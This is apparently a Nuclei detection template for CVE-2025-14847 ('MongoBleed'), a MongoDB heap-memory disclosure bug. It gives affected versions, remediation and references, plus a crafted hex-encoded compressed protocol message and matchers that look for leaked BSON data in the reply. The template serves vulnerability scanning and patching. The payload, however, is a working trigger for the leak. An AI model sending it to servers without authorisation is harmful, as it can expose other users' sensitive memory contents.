id: CVE-2025-14847
info:
  name: MongoDB Server - Information Disclosure (MongoBleed)
  author: pussycat0x,joe-desimone,DhiyaneshDK,Wiz Research
  severity: high
  description: |
    Mismatched length fields in Zlib compressed protocol headers may allow a read of uninitialized heap memory by an unauthenticated client. This issue affects all MongoDB Server v7.0 prior to 7.0.28 versions, MongoDB Server v8.0 versions prior to 8.0.17, MongoDB Server v8.2 versions prior to 8.2.3, MongoDB Server v6.0 versions prior to 6.0.27, MongoDB Server v5.0 versions prior to 5.0.32, MongoDB Server v4.4 versions prior to 4.4.30, MongoDB Server v4.2 versions greater than or equal to 4.2.0, MongoDB Server v4.0 versions greater than or equal to 4.0.0, and MongoDB Server v3.6 versions greater than or equal to 3.6.0.
  impact: |
    Unauthenticated clients can read uninitialized heap memory, potentially exposing sensitive information.
  remediation: |
    Update to versions 7.0.28, 8.0.17, 8.2.3, 6.0.27, 5.0.32, 4.4.30 or later.
  reference:
    - https://jira.mongodb.org/browse/SERVER-115508
    - https://github.com/joe-desimone/mongobleed
  tags: cve,cve2025,mongodb,memory-leak,network

tcp:
  - host:
      - "{{Hostname}}"
    inputs:
      - data: "2a0000000100000000000000dc070000dd0700003200000002789c636080028144064620050002ca0073"
        type: hex


    read-size: 1024
    matchers:
      - type: dsl
        dsl:
          - "contains(toupper(zlib_decode(substr(data, 25))), 'BSON')"
          - "contains(toupper(data), 'BSON')"
        condition: or
